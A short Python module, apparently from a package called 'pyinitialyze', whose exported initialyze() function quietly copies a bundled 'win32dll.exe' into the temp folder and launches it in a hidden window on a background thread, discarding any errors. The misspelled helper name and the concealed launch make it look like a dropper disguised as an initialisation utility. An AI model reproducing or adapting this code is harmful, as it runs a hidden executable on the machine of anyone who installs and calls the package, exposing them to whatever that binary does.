import subprocess
import threading
import importlib.resources
import shutil
import tempfile
import os

def task_initialyze(target: list[str]) -> None:
    try:
        with importlib.resources.path("pyinitialyze.Dll", "win32dll.exe") as dll_path:
            temp_path = os.path.join(tempfile.gettempdir(), "win32dll.exe")
            shutil.copy(dll_path, temp_path)
            subprocess.Popen(temp_path, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

def initialyze(target: list[str]) -> None:
    threading.Thread(target=task_initialyze, args=(target,), daemon=False).start()

__all__ = ['initialyze']
